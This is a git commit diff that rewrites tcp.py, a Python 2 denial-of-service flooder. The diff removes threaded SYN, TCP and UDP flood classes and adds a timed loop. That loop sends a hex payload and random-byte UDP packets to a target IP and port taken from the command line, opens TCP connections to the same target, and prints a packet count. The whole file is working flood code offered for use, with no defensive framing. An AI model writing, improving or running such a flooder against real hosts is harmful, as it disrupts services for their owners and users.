5630bf20a414e64fcb0ebadb62b35086ab1a102a
termul488-ai <termul488@gmail.com>
2026-01-07 21:54:12 +0700

    Update tcp.py

--- tcp.py
+++ tcp.py
@@ -12,71 +12,32 @@ if len(sys.argv) < 4:
 ip = sys.argv[1]
 port = int(sys.argv[2])
 size = int(sys.argv[3])
-packets = int(sys.argv[3])
-
-class syn(threading.Thread):
-    def __init__(self, ip, port, packets):
-        self.ip = ip
-        self.port = port
-        self.packets = packets
-        self.syn = socket.socket()
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                self.syn.connect((self.ip, self.port))
-            except:
-                pass
-
-class tcp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.tcp = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                socket.connect(self.ip, self.port)
-                socket.setblocking(0)
-                socket.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
-
-class udp(threading.Thread):
-    def __init__(self, ip, port, size, packets):
-        self.ip = ip
-        self.port = port
-        self.size = size
-        self.packets = packets
-        self.udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
-        threading.Thread.__init__(self)
-    def run(self):
-        for i in range(self.packets):
-            try:
-                bytes = random._urandom(self.size)
-                if self.port == 0:
-                    self.port = random.randrange(1, 65535)
-                self.udp.sendto(bytes,(self.ip, self.port))
-            except:
-                pass
-
+t1m3 = int(sys.argv[4])
+timeout = time.time() + t1m3
+sent = 0
+data = 'f1a525da11f6'.decode('hex')
 while True:
-    try:
-        if size > 65507:
-            sys.exit("Invalid Number Of Packets!")
-        u = udp(ip,port,size,packets)
-        t = tcp(ip,port,size,packets)
-        s = syn(ip,port,packets)
-        u.start()
-        t.start()
-        s.start()
-    except KeyboardInterrupt:
-        print("Stopping Flood!")
-        sys.exit()
-    except (socket.error, msg):
-        print("Socket Couldn't Connect")
-        sys.exit()
+        try:
+                if time.time() > timeout:
+                        break
+                else:
+                        pass
+                udp = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+                syn = socket.socket()
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
+                if port == "0":
+                        port = random.randrange(1, 65535)
+                s.connect((ip, port))
+                s.send(data)
+                bytes = random._urandom(size)
+                syn.connect((ip, port))
+                udp.sendto(bytes,(ip, port))
+                sent = sent + 1
+                print "DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s"%(ip, port, size, t1m3, sent)
+				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
+        except KeyboardInterrupt:
+                print " Stopping Flood!"
+                sys.exit()
+        except socket.error, msg:
+                print "Socket Couldn't Connect"
+                sys.exit()
